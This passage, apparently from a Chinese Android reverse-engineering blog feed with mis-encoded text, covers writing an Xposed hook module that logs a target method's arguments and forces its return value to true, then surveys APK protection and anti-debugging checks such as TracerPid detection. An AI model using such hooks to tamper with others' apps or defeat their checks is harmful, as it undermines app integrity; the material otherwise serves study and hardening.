class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="Xposed-Framework"><a href="#Xposed-Framework" class="headerlink" title="Xposed Framework"></a>Xposed Framework</h1><h2 id="åŸç†ç®€è¿°"><a href="#åŸç†ç®€è¿°" class="headerlink" title="åŸç†ç®€è¿°"></a><strong>åŸç†ç®€è¿°</strong></h2><p>Xposedæ¡†æ¶é€šè¿‡å®‰è£…æ¨¡å—æ¥å®ç°éœ€è¦çš„åŠŸèƒ½ã€‚æ‰€è°“æ¨¡å—æ˜¯æŒ‡ä¸€ç±»ç‰¹æ®Šçš„appï¼Œæ­¤ç±»appé€šè¿‡ä¿®æ”¹Zygoteæ¥å®ç°ä¸€äº›è®¾è®¡å†…æ ¸ä»¥åŠé«˜æƒé™çš„åŠŸèƒ½ï¼Œç”±Xposedç®¡ç†ã€‚å…¶ä¸­ï¼ŒZygoteæ˜¯Androidçš„å†…æ ¸ï¼Œæ¯ä¸ªAPPå‡ç”±Zygote forkå‡ºçš„è™šæ‹Ÿæœºæ¥è¿è¡Œï¼Œè€ŒXposedæ¡†æ¶ä¸­çš„æ¨¡å—å¯ä»¥é‡å†™å¹¶æ›¿æ¢Zygoteçš„æ‰§è¡Œæ–‡ä»¶app_processï¼Œå³å¯ä»ä¸€å¼€å§‹å°±ä¿®æ”¹æ•´ä¸ªè¿›ç¨‹ã€‚</p><p>è¯¦ç»†åŸç†å‚è§<a href="https://www.freebuf.com/articles/terminal/56453.html">é“¾æ¥</a>ã€‚</p><h2 id="ä½¿ç”¨è¿‡ç¨‹"><a href="#ä½¿ç”¨è¿‡ç¨‹" class="headerlink" title="ä½¿ç”¨è¿‡ç¨‹"></a>ä½¿ç”¨è¿‡ç¨‹</h2><h3 id="æ‰‹æœºç«¯"><a href="#æ‰‹æœºç«¯" class="headerlink" title="æ‰‹æœºç«¯"></a>æ‰‹æœºç«¯</h3><p>1.æ‰‹æœºrootåç›´æ¥å®‰è£…<a href="http://xposed.appkg.com/nav">xpose installer</a> ï¼Œéœ€è¦æ³¨æ„android5.0ä»¥ä¸‹å’Œä»¥ä¸Šå®‰è£…çš„æ˜¯ä¸åŒç‰ˆæœ¬ã€‚</p><p>2.é‡å¯åæç¤ºå®‰è£…å®Œæˆ</p><p><img src="https://z3.ax1x.com/2021/03/25/6LUZLt.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUZLt.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h3 id="PCç«¯"><a href="#PCç«¯" class="headerlink" title="PCç«¯"></a>PCç«¯</h3><p>1.åœ¨Android Studioä¸­æ–°å»ºç©ºç™½å·¥ç¨‹(No Activity)ï¼Œå°†åº“æ–‡ä»¶æ‹–å…¥libsç›®å½•ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6LUpdK.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUpdK.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>2.åœ¨Javaé¡¹ç›®çš„ç¬¬ä¸€ä¸ªåŒ…é‡Œæ–°å»ºclassã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6LUPiD.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUPiD.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xp;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hook</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;åŒ…å&quot;</span>))&#123;</span><br><span class="line">      XposedHelpers.findAndHookMethod(<span class="string">&quot;åŒ…å.ç±»å&quot;</span>, loadPackageParam.classLoader,</span><br><span class="line">        <span class="string">&quot;hookå‡½æ•°å&quot;</span>, String.class, String.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line"><span class="comment">//æ‰§è¡Œè¢«hookå‡½æ•°å‰è¿è¡Œ</span></span><br><span class="line">          <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;Arg1: &quot;</span> + param.args[<span class="number">0</span>]);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;Arg2: &quot;</span> + param.args[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//XposedBridge.log(&quot;Arg3: &quot; + param.args[2]);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å°å †æ ˆä¿¡æ¯</span></span><br><span class="line">            StackTraceElement[] wodelogs = <span class="keyword">new</span> Throwable(<span class="string">&quot;wodelog&quot;</span>).getStackTrace();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;wodelogs.length;i++)&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;æŸ¥çœ‹å †æ ˆ:&quot;</span>+wodelogs[i].toString());</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line"><span class="comment">//æ‰§è¡Œè¢«hookå‡½æ•°åè¿è¡Œ(è¿”å›å‰)</span></span><br><span class="line">          <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">XposedBridge.log(<span class="string">&quot;Result before modified: &quot;</span> + param);</span><br><span class="line">            param.setResult(<span class="keyword">true</span>); <span class="comment">// å‡½æ•°è¿”å›å€¼ä¿®æ”¹ä¸ºtrue</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.åˆ›å»ºassetsæ–‡ä»¶å¤¹ï¼Œæ–°å»ºæ–‡ä»¶xposed_initï¼Œå†™å…¥â€œåŒ…å+ç±»åâ€ï¼Œæ¨¡å—ä»æ­¤å¤„å¯»æ‰¾ç¨‹åºå…¥å£ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6LU9IO.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LU9IO.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>4.ä¿®æ”¹æ¸…å•æ–‡ä»¶AndroidManifest.xmlï¼Œåœ¨<application>æ ‡ç­¾ä¹‹é—´æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- æ·»åŠ æ ‡è¯† --&gt;</span></span><br><span class="line"> &lt;meta-data</span><br><span class="line">     android:name=&quot;xposedmodule&quot;</span><br><span class="line">     android:value=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- è½½å…¥Hookæ¨¡å—ä¹‹åæ˜¾ç¤ºçš„ä¿¡æ¯ --&gt;</span></span><br><span class="line"> &lt;meta-data</span><br><span class="line">     android:name=&quot;xposeddescription&quot;</span><br><span class="line">     android:value=&quot;Xposed Proxy For HOOK&quot;/&gt;</span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- è§„å®šjaråŒ…çš„ç‰ˆæœ¬ä¿¡æ¯ --&gt;</span></span><br><span class="line"> &lt;meta-data</span><br><span class="line">     android:name=&quot;xposedminversion&quot;</span><br><span class="line">     android:value=&quot;54&quot;/&gt;</span><br></pre></td></tr></table></figure><p>ğŸ‘‡</p><img src="https://z3.ax1x.com/2021/03/25/6LUiJe.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUiJe.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" /><p>5.ä¿®æ”¹build.gradle(app)ï¼Œæ·»åŠ sourceSetsæ®µè½ï¼Œä¿®æ”¹fileTreeä¸ºcompileOnly</p><img src="https://z3.ax1x.com/2021/03/25/6LUFRH.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUFRH.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /><p>6.æ„é€ è¿è¡Œï¼Œåœ¨è™šæ‹Ÿæœºä¸­æŸ¥çœ‹ï¼Œåœ¨installerä¸­å‹¾é€‰æ¨¡å—</p><p><img src="https://z3.ax1x.com/2021/03/25/6LUkzd.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUkzd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>7.é‡å¯ååœ¨installerä¸­æŸ¥çœ‹æ—¥å¿—ï¼Œå®‰è£…å®Œæˆ</p><p><img src="https://z3.ax1x.com/2021/03/25/6LUEQA.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUEQA.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidRe </tag>
            
            <tag> Summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Protection</title>
      <link href="2021/03/08/Android%20Protection/"/>
      <url>2021/03/08/Android%20Protection/</url>
      
        <content type="html"><![CDATA[<p>å…³äºAPKåŒ…çš„ä¿æŠ¤ä»¥åŠä»£ç çš„åè°ƒè¯•æ–¹æ³•ã€‚<span id="more"></span></p><h1 id="APKä¿æŠ¤"><a href="#APKä¿æŠ¤" class="headerlink" title="APKä¿æŠ¤"></a>APKä¿æŠ¤</h1><h2 id="Javaä»£ç æ··æ·†"><a href="#Javaä»£ç æ··æ·†" class="headerlink" title="Javaä»£ç æ··æ·†"></a>Javaä»£ç æ··æ·†</h2><p>é€šå¸¸ä¸ºäº†æé«˜ä»£ç å¯è¯»æ€§ï¼Œå¼€å‘è€…ä¼šç»™å„ä¸ªæ ‡è¯†èµ‹äºˆç›¸åº”çš„æ„ä¹‰ï¼ŒåŒ…åç±»åéƒ½ä¼šç»è¿‡ç›¸åº”çš„å‘½åã€‚ä½†æ˜¯å½“ç¨‹åºè¢«æ‰“åŒ…æ—¶ï¼Œä¸éœ€è¦è€ƒè™‘å¯è¯»æ€§ï¼Œå› ä¸ºåŒ…åç±»åæˆ–è€…æ ‡è¯†ç¬¦åªéœ€è¦èƒ½å‡†ç¡®å¯»å€å³å¯ï¼Œäºæ˜¯å¼€å‘è€…ä¼šå¯¹å¯æ‰§è¡Œæ–‡ä»¶çš„æºä»£ç è¿›è¡Œæ··æ·†ï¼Œè¿™æ ·å¯ä»¥ä¸€å®šç¨‹åº¦çš„å¢åŠ é€†å‘è¿‡ç¨‹ä¸­æ‰€éœ€çš„æ—¶é—´ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6LYZLV.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LYZLV.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>ä½å¯è¯»æ€§å¯ä»¥åŠé€€ä¸€éƒ¨åˆ†é€†å‘è€…ï¼Œä½†æ˜¯æœ¬è´¨ä¸Šæ¥è¯´ï¼Œæ•´ä¸ªä»£ç çš„é€»è¾‘å¹¶æ²¡æœ‰æ”¹å˜ï¼Œå› æ­¤å¹¶ä¸èƒ½ä¸€åŠ³æ°¸é€¸åœ°è§£å†³ä»£ç ä¿æŠ¤çš„é—®é¢˜ã€‚</p><h2 id="èµ„æºæ–‡ä»¶æ··æ·†"><a href="#èµ„æºæ–‡ä»¶æ··æ·†" class="headerlink" title="èµ„æºæ–‡ä»¶æ··æ·†"></a>èµ„æºæ–‡ä»¶æ··æ·†</h2><p>ç±»ä¼¼ä»£ç æ··æ·†ï¼Œé™ä½èµ„æºidå’Œèµ„æºæ–‡ä»¶åçš„å¯è¯»æ€§ã€‚</p><h2 id="ç­¾åéªŒè¯"><a href="#ç­¾åéªŒè¯" class="headerlink" title="ç­¾åéªŒè¯"></a>ç­¾åéªŒè¯</h2><p>æŸäº›apkæ–‡ä»¶è§£å‹åï¼Œå‘ç°é‡Œé¢å­˜åœ¨MANIFEST.MFæ–‡ä»¶ï¼Œè¿™å°±æ˜¯apkçš„ç­¾åæ–‡ä»¶ã€‚</p><p>ç­¾åæ–‡ä»¶ä¸­ä¿å­˜ç€apkæ–‡ä»¶çš„ä¿¡æ¯æ‘˜è¦å¹¶è¿›è¡Œäº†åŠ å¯†ï¼Œå¦‚æœé€šè¿‡é€†å‘å¯¹apkè¿›è¡Œé‡æ–°æ‰“åŒ…ï¼Œä¼šä½¿å¾—ç­¾åæ–‡ä»¶ä¸åŸæ–‡ä»¶ä¸ä¸€è‡´ï¼Œæ— æ³•é€šè¿‡ç­¾åæ ¡éªŒã€‚</p><p>ç­¾åéªŒè¯æ–¹å¼å¾ˆå¤šï¼Œä»¥ä¸‹ä¾‹å­æ˜¯è¢«å®šä¹‰åœ¨nativeå±‚çš„ä¸‰ä¸ªç­¾åç›¸å…³å‡½æ•°ï¼Œäººé€çˆ±ç§°â€œç­¾åä¸‰å…„å¼Ÿâ€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getPackageName()</span><br><span class="line">getPackageManage()</span><br><span class="line">getPackageInfo()</span><br></pre></td></tr></table></figure><p>ç­¾åéªŒè¯å¯ä»¥é€šè¿‡ä¿®æ”¹ç¨‹åºé€»è¾‘è¿›è¡Œç»•è¿‡ï¼Œå®é™…æƒ…å†µå®é™…åˆ†æã€‚</p><h1 id="åè°ƒè¯•"><a href="#åè°ƒè¯•" class="headerlink" title="åè°ƒè¯•"></a>åè°ƒè¯•</h1><h2 id="å…³é”®æ–‡ä»¶æ£€æµ‹"><a href="#å…³é”®æ–‡ä»¶æ£€æµ‹" class="headerlink" title="å…³é”®æ–‡ä»¶æ£€æµ‹"></a>å…³é”®æ–‡ä»¶æ£€æµ‹</h2><p>éå†**/data/local/tmp<strong>è·¯å¾„ï¼ŒæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨</strong>android_server<strong>ï¼Œ</strong>android_server64**è¿™æ ·çš„æ–‡ä»¶ã€‚å¦‚æœå­˜åœ¨åˆ™æ€æ­»å½“å‰è¿›ç¨‹ã€‚</p><h2 id="è°ƒè¯•ç«¯å£æ£€æµ‹"><a href="#è°ƒè¯•ç«¯å£æ£€æµ‹" class="headerlink" title="è°ƒè¯•ç«¯å£æ£€æµ‹"></a>è°ƒè¯•ç«¯å£æ£€æµ‹</h2><p>ä¸€äº›è°ƒè¯•å™¨åœ¨è°ƒè¯•å®‰å“ç¨‹åºæ—¶ä¼šå ç”¨é»˜è®¤çš„ç«¯å£ï¼Œä¾‹å¦‚IDAä½¿ç”¨çš„ç«¯å£ï¼š<strong>23946</strong>ã€‚æ£€éªŒå ç”¨è¿™äº›ç«¯å£çš„è¿›ç¨‹å³å¯è½»æ˜“åˆ¤æ–­ç¨‹åºæ˜¯å¦è¢«è°ƒè¯•ã€‚</p><p>ä½†æ¢æˆéé»˜è®¤ç«¯å£å³å¯ç»•è¿‡ã€‚</p><h2 id="è¿›ç¨‹åç§°æ£€æµ‹"><a href="#è¿›ç¨‹åç§°æ£€æµ‹" class="headerlink" title="è¿›ç¨‹åç§°æ£€æµ‹"></a>è¿›ç¨‹åç§°æ£€æµ‹</h2><p>Androidç³»ç»Ÿä¸­(å…¶å®Linuxä¹Ÿæ˜¯)ï¼Œæ¯ä¸ªè¿›ç¨‹è¿è¡Œæ—¶éƒ½ä¼šç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„æ–‡ä»¶å¤¹ï¼Œè·¯å¾„ä¸º**/proc/pid/<strong>ï¼Œå…¶<a href="https://blog.csdn.net/zdwzzu2006/article/details/7747977">ç›®å½•</a>ä¸‹çš„</strong>status**æ–‡ä»¶ç”¨äºè®°å½•è¿›ç¨‹çŠ¶æ€ã€‚è€Œstatusæ–‡ä»¶ä¸­çš„Traceridå­—æ®µï¼Œåˆç”¨äºè®°å½•å½“å‰è¿›ç¨‹çš„è°ƒè¯•è¿›ç¨‹pidã€‚</p><p>æ£€æµ‹æ—¶åªéœ€è¯»å–æ­¤å¤„çš„pidåˆ¤æ–­æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºå†æŸ¥è¯¢æ­¤pidå¯¹åº”çš„æ˜¯ä»€ä¹ˆè¿›ç¨‹ã€‚å¦‚æœæ˜¯android_serverè¿™æ ·çš„ä¸è°ƒè¯•ç›¸å…³è¿›ç¨‹ï¼Œåˆ™ç›´æ¥æ€æ­»å½“å‰è¿›ç¨‹é˜»æ­¢è°ƒè¯•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">coursecheck</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> bufsize = <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">char</span> filename[bufsize];</span><br><span class="line">    <span class="keyword">char</span> line[bufsize];</span><br><span class="line">    <span class="keyword">char</span> name[bufsize];</span><br><span class="line">    <span class="keyword">char</span> nameline[bufsize];</span><br><span class="line">    <span class="keyword">int</span> pid = getpid();</span><br><span class="line">    <span class="comment">//å…ˆè¯»å–Tracepidçš„å€¼</span></span><br><span class="line">    <span class="built_in">sprintf</span>(filename, <span class="string">&quot;/proc/%d/status&quot;</span>, pid);</span><br><span class="line">    FILE *fd=fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">while</span>(fgets(line,bufsize,fd))</span><br><span class="line">&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;TracerPid&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> statue =atoi(&amp;line[<span class="number">10</span>]);</span><br><span class="line">                <span class="keyword">if</span>(statue!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">                    <span class="built_in">sprintf</span>(name,<span class="string">&quot;/proc/%d/cmdline&quot;</span>,statue);</span><br><span class="line">                    FILE *fdname=fopen(name,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(fdname!= <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">                        <span class="keyword">while</span>(fgets(nameline,bufsize,fdname))</span><br><span class="line">&#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="built_in">strstr</span>(nameline,<span class="string">&quot;android_server&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">                                <span class="keyword">int</span> ret=kill(pid,SIGKILL);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    fclose(fdname);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è½®è¯¢æ£€æµ‹"><a href="#è½®è¯¢æ£€æµ‹" class="headerlink" title="è½®è¯¢æ£€æµ‹"></a>è½®è¯¢æ£€æµ‹</h2><p>å¾ªç¯æ£€æµ‹å½“å‰è¿›ç¨‹çŠ¶æ€æ–‡ä»¶ï¼Œå³ ï¼Œåˆ¤æ–­traceridå­—æ®µæ˜¯å¦ä¸º0ï¼Œè‹¥ä¸ä¸º0åˆ™åˆ¤å®šè¿›ç¨‹å¤„äºè¢«debugçŠ¶æ€ï¼Œè¿›è€Œå…³é—­è¿›ç¨‹ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6LtCm6.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LtCm6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h2 id="Self-Debugging"><a href="#Self-Debugging" class="headerlink" title="Self-Debugging"></a>Self-Debugging</h2><p>å½“å‰è¿›ç¨‹fork()å¾—åˆ°å­è¿›ç¨‹åï¼Œå­è¿›ç¨‹å¯¹çˆ¶è¿›ç¨‹è¿›è¡Œdebugï¼Œç”±äºçˆ¶è¿›ç¨‹è¢«å ç”¨(è¿›ç¨‹åŒä¸€æ—¶é—´åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹attach)ï¼Œä½¿å¾—å…¶ä»–ç¨‹åºæ— æ³•ç›´æ¥å¯¹çˆ¶è¿›ç¨‹è¿›è¡Œdebugã€‚</p><p>è§£å†³æ–¹æ³•ï¼šé€šè¿‡debugå­è¿›ç¨‹æ¥é—´æ¥debugçˆ¶è¿›ç¨‹ã€‚</p><h2 id="æ¨¡æ‹Ÿå™¨æ£€æµ‹"><a href="#æ¨¡æ‹Ÿå™¨æ£€æµ‹" class="headerlink" title="æ¨¡æ‹Ÿå™¨æ£€æµ‹"></a>æ¨¡æ‹Ÿå™¨æ£€æµ‹</h2><p>æ ¹æ®æ¨¡æ‹Ÿå™¨çš„ç‰¹å¾ï¼Œç¨‹åºå¯ä»¥åˆ¤æ–­è‡ªèº«æ˜¯å¦è¿è¡Œäºæ¨¡æ‹Ÿå™¨ä¸­ã€‚ç‰¹å¾å€¼å¤§è‡´æœ‰ä¸‹é¢è¿™äº›ï¼š</p><ol><li>Device ID - è®¾å¤‡åºåˆ—å·</li><li>ç”µè¯å·ç </li><li>IMSIè¯†åˆ«ç </li><li>è¿è¥å•†åç§°</li><li>QEMUç›¸å…³çš„äºŒè¿›åˆ¶æ–‡ä»¶</li><li>CPUä¿¡æ¯</li></ol><p>é™¤æ­¤ä¹‹å¤–çš„<a href="https://bbs.pediy.com/thread-225717.html">æ¨¡æ‹Ÿå™¨æ£€æµ‹æ–¹æ³•</a>è¿˜æœ‰å¾ˆå¤šã€‚</p><h2 id="Javaå±‚åè°ƒè¯•"><a href="#Javaå±‚åè°ƒè¯•" class="headerlink" title="Javaå±‚åè°ƒè¯•"></a>Javaå±‚åè°ƒè¯•</h2><h3 id="0x00-Debugæ¡ä»¶"><a href="#0x00-Debugæ¡ä»¶" class="headerlink" title="0x00.Debugæ¡ä»¶"></a>0x00.Debugæ¡ä»¶</h3><ul><li><p>apkä¸­çš„AndroidMainfest.xmlä¸­ï¼Œapplicationæ ‡ç­¾ä¸‹æœ‰è¯¥å±æ€§ï¼š</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Android:debuggable=true</span><br></pre></td></tr></table></figure></li><li><p>è®¾å¤‡å¯è°ƒè¯•ï¼Œå³æ‹¥æœ‰å¦‚ä¸‹å±æ€§ï¼š</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ro.debugable=1</span><br></pre></td></tr></table></figure><p>  